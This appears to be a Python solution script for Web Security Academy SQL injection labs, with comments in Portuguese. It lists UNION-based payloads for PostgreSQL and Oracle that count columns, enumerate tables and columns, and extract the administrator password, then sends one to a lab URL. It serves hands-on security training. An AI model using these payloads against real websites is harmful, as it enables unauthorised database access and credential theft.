import requests

# Parâmetro vulnerável: category

# PAYLOADS - Não Oracle
# Descobrindo nº colunas da tabela da consulta original
sqli_1 = "' ORDER BY 1--" # OK!
sqli_2 = "' ORDER BY 2--" # OK!
sqli_3 = "' ORDER BY 3--" # Erro! Tabela original tem 2 colunas
# Descobrindo colunas do tipo string da tabela da consulta original
sqli_4 = "' UNION SELECT 'a',NULL--" # OK! 1ª coluna tipo string
sqli_5 = "' UNION SELECT NULL,'a'--" # OK! 2ª coluna tipo string
# Ataques
sqli_6 = "' UNION SELECT NULL,version()--" # PostgreSQL 12.22
sqli_7 = "' UNION SELECT NULL,table_name FROM information_schema.tables--" # Lista as tabelas do BD
sqli_8 = "' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name = 'users_bdmsvb'--" # Lista as colunas da tabela de usuários
sqli_9 = "' UNION SELECT NULL,password_cermnh FROM users_bdmsvb WHERE username_hpfcgp = 'administrator'--" # Captura senha do administrator

# PAYLOADS - Oracle
# Descobrindo nº colunas da tabela da consulta original
sqli_10 = "' ORDER BY 1--" # OK!
sqli_11 = "' ORDER BY 2--" # OK!
sqli_12 = "' ORDER BY 3--" # Erro! Tabela original tem 2 colunas
# Descobrindo colunas do tipo string da tabela da consulta original
sqli_13 = "' UNION SELECT 'a',NULL-- from dual" # OK! 1ª coluna tipo string
sqli_14 = "' UNION SELECT NULL,'a'-- from dual" # OK! 2ª coluna tipo string
# Ataques
sqli_15 = "' UNION SELECT NULL,banner FROM v$version--" # Oracle 11.2.0.2.0
sqli_16 = "' UNION SELECT NULL,table_name FROM all_tables--" # Lista as tabelas do BD
sqli_17 = "' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name = 'USERS_NQPZJT'--" # Lista as colunas da tabela de usuários
sqli_18 = "' UNION SELECT NULL,PASSWORD_RYLSET FROM USERS_NQPZJT WHERE USERNAME_NRWIAQ = 'administrator'--" # Captura senha do administrator

url = 'https://0a3d00cf0437ad9182f30be5002500a4.web-security-academy.net/filter'
params = {
    "category": "Gifts" + sqli_9
}
response = requests.get(url, params=params)

print(response.text)